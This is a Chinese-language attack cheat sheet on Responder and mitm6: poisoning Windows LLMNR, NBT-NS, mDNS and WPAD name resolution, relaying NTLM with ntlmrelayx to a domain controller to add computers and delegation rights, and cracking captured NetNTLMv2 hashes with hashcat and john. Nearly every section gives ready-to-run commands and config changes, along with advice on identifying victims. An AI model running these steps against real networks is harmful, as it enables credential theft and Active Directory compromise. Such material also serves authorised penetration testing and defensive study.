# Responder 配置与投毒机制

Responder 利用 Windows 名称解析回退机制，在 DNS 查询失败时应答广播请求，将认证重定向到攻击者。

---

## 1. 名称解析链

Windows 按以下顺序解析主机名：

```
1. 本地 hosts 文件
2. 本地 DNS 缓存
3. DNS 服务器查询
4. LLMNR 广播 (UDP 5355)    ← Responder 在此拦截
5. NBT-NS 广播 (UDP 137)    ← Responder 在此拦截
6. mDNS 广播 (UDP 5353)     ← Responder 在此拦截
```

当用户输入错误的主机名（如 `\\fileservre` 而不是 `\\fileserver`）或 DNS 查询失败时，系统会回退到广播协议，Responder 抢先应答，将认证引导到攻击者。

### 各协议说明

| 协议 | 端口 | 作用域 | 说明 |
|------|------|--------|------|
| LLMNR | UDP 5355 | 本地链路 | Link-Local Multicast Name Resolution，IPv4/IPv6 |
| NBT-NS | UDP 137 | 本地子网 | NetBIOS Name Service，仅 IPv4 |
| mDNS | UDP 5353 | 本地链路 | Multicast DNS，Apple/Linux 环境多见 |

---

## 2. 捕获模式 vs 中继模式

### 捕获模式（默认）

所有服务开启，直接捕获 NetNTLMv2 Hash 用于离线破解：

```bash
# 完整捕获模式
sudo responder -I eth0 -dwPv
```

参数说明：

| 参数 | 作用 |
|------|------|
| `-I` | 指定监听网络接口 |
| `-d` | 启用 DHCP 投毒 |
| `-w` | 启用 WPAD 代理 |
| `-P` | 强制 NTLM 认证代理请求 |
| `-v` | 详细输出 |

日志位置：

```bash
ls /usr/share/responder/logs/
# 格式: SMB-NTLMv2-SSP-<IP>.txt
```

### 中继模式（配合 ntlmrelayx）

**关闭 SMB 和 HTTP 服务器**，将这些端口让给 ntlmrelayx 监听：

编辑 `/etc/responder/Responder.conf`：

```ini
[Responder Core]
SQL = On
SMB = Off      # 关键：关闭以避免端口冲突
Kerberos = On
FTP = On
HTTP = Off     # 关键：关闭以避免端口冲突
HTTPS = On
DNS = On
LDAP = On
```

启动顺序：

```bash
# 终端 1：启动 Responder（仅投毒，不捕获 SMB/HTTP）
sudo responder -I eth0 -dw -v

# 终端 2：启动 ntlmrelayx 接管 SMB/HTTP 端口
ntlmrelayx.py -tf relay_targets.txt -smb2support
```

---

## 3. WPAD 代理攻击

Web Proxy Auto-Discovery（WPAD）允许浏览器自动发现代理配置。Responder 可冒充 WPAD 服务器捕获认证。

### 攻击流程

```
1. 客户端广播查询 "wpad" 主机名
2. Responder 应答称自己是 WPAD 服务器
3. 客户端请求 wpad.dat 代理配置
4. Responder 返回指向自身的代理配置
5. 客户端所有 HTTP 流量经过 Responder 代理
6. Responder 对代理请求要求 NTLM 认证 → 捕获 Hash
```

### 启用 WPAD

```bash
sudo responder -I eth0 -wP
```

- `-w`：启动 WPAD 代理服务器
- `-P`：对代理请求强制 NTLM 认证

---

## 4. Hash 捕获与破解

### 捕获格式

```
username::DOMAIN:challenge:response:blob
```

示例：

```
jsmith::CORP:01f4015df25f87e4:3BF36B5251AC8C43032472F019768D74:0101000000000000...
```

### Hash 类型与破解

| 类型 | Hashcat 模式 | 破解难度 |
|------|-------------|----------|
| NetNTLMv1 | 5500 | 较快 |
| NetNTLMv2 | 5600 | 较慢 |

```bash
# NetNTLMv2 破解
hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 查看已破解结果
hashcat -m 5600 hashes.txt --show

# john 替代
john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Responder 数据库

```bash
# 捕获的 Hash 存储在 SQLite 数据库
/opt/tools/Responder/Responder.db
# 或
/usr/share/responder/Responder.db

# 清除数据库避免跳过重复 Hash
rm /opt/tools/Responder/Responder.db
```

---

## 5. 配置文件关键修改

配置文件路径：`/etc/responder/Responder.conf`

### 中继场景必改项

```ini
[Responder Core]
SMB = Off      # 让 ntlmrelayx 监听 445
HTTP = Off     # 让 ntlmrelayx 监听 80
```

### 其他可调选项

```ini
[Responder Core]
; 数据库路径
Database = /opt/tools/Responder/Responder.db

; Challenge 固定值（方便破解，但降低隐蔽性）
Challenge = Random

; 关闭不需要的服务减少噪声
FTP = Off
LDAP = Off
```

---

## 6. mitm6 IPv6 DNS 投毒

Windows 默认启用 IPv6 并优先使用。mitm6 通过 DHCPv6 投毒劫持 DNS 解析，配合 WPAD 或 ntlmrelayx 实现认证捕获。

### 原理

```
1. mitm6 发送 DHCPv6 响应，为目标分配 IPv6 地址
2. 设置攻击者为 DNS 服务器
3. 所有 DNS 查询发到攻击者 → 可解析为攻击者 IP
4. 配合 WPAD：客户端查询 wpad.domain → 指向攻击者
5. 触发 NTLM 认证
```

### 基本用法

```bash
# 启动 IPv6 DNS 投毒
mitm6 -d DOMAIN -i eth0
```

### 配合 ntlmrelayx

```bash
# 终端 1：mitm6 投毒
mitm6 -d DOMAIN -i eth0

# 终端 2：中继到 LDAPS + RBCD
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN \
  --delegate-access --add-computer

# 终端 2（替代）：中继到 LDAPS + loot 收集
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN -l loot
```

### mitm6 + HSTS 绕过

```bash
mitm6 -d DOMAIN -i eth0 --hsts
```

### 注意事项

- mitm6 可能影响网络稳定性（DHCPv6 投毒影响其他主机）
- 建议短时间运行，获取所需认证后停止
- `-hw` 参数可指定 WPAD 主机名过滤

---

## 分析模式

被动监听网络广播，不投毒不应答，用于前期侦察：

```bash
sudo responder -I eth0 -A
```

用途：
- 观察网络中有哪些名称解析广播
- 识别潜在受害者和查询模式
- 评估投毒攻击的可行性
